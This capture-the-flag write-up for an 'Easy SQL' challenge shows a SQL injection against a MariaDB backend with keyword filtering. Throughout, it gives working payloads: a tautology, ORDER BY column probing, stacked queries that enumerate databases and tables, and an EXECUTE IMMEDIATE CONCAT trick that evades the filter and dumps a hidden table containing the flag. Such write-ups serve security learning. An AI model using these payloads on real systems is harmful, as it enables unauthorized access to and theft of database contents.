---
description: 'Filtered MariaDB injection, stacked queries'
---

# Easy SQL \(200\)

### Basic Payload

`1' or '1'='1`

```text
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(2) {
  [0]=>
  string(1) "2"
  [1]=>
  string(12) "miaomiaomiao"
}

array(2) {
  [0]=>
  string(6) "114514"
  [1]=>
  string(2) "ys"
}
```

### Finding Number of Columns

`1' ORDER BY 2 -- -`: No error 

`1' ORDER BY 3 -- -`: error 1054 : Unknown column '3' in 'order clause'

So there are 2 columns

### Stacked Queries

Many keywords, such as SELECT and UNION, are filtered out by regex. However, it appears stacked queries are allowed.

`1'; SHOW DATABASES;`

```text
array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}
```

`1'; SHOW TABLES;`

```text
array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}
```

`1'; DESCRIBE words;`

```text
array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(11)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(3) "PRI"
  [4]=>
  NULL
  [5]=>
  string(14) "auto_increment"
}

array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

``1'; DESCRIBE `1919810931114514`;``

`1'; USE information_schema; SHOW TABLES;`

`1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`

### Execute Immediate

Unlike MySQL, MariaDB supports the `EXECUTE IMMEDIATE` command which will execute a string as an SQL query.

`1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM words');`

``1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM `1919810931114514`');``

Note the backticks around 1919810931114514, they are needed to prevent the table name from being interpreted as a number.

```text
array(1) {
  [0]=>
  string(73) "DSO-NUS{427a3c725d559d066e010131695880665436761182ac104f72d6a5d70912c2e6}"
}
```

